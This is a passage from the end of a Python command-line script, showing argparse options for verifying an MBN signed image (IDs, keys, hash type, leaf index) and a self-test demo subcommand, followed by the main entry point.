    p.add_argument("--mbn", required=True)
    p.add_argument("--sw-id", default="0000000000000000")
    p.add_argument("--hw-id", default="0000000000000000")
    p.add_argument("--key1")
    p.add_argument("--key2")
    p.add_argument("--hash", choices=["auto", "sha1", "sha256"], default="auto")
    p.add_argument("--leaf-index", type=int, default=0)
    p.set_defaults(func=cmd_verify)

    p = sub.add_parser("selftest", help="built-in end-to-end demo (no real donor needed)")
    p.add_argument("--L", type=int, help="explicit signature length")
    p.add_argument("--sw-id", default=None)
    p.add_argument("--hw-id", default=None)
    p.set_defaults(func=cmd_selftest)

    a = ap.parse_args()
    return a.func(a) or 0


if __name__ == "__main__":
    sys.exit(main())
